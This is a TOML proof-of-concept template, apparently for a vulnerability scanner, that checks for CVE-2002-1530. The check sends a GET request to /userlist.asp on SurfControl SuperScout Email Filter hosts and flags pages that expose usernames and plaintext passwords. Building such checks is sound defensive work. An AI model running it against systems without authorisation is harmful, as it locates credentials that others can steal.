[info]
author = "ave"
description = "验证SurfControl SuperScout Email Filter管理后台STEMWADM的userlist.asp端点是否暴露用户名和明文密码。发送HTTP请求至userlist.asp，若返回的HTML页面中包含用户编辑表单且明文展示密码字段，则判定存在凭据泄露。"
id = "POC-AVE-2002-0629"
name = "CVE-2002-1530 PoC"
severity = "medium"
tags = ["ave-2002-0629"]
vuln_id = [
    "CVE-2002-1530",
    "AVE-2002-0629",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/userlist.asp"
protocol = "http"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "password",
    "userlist",
    "username",
]
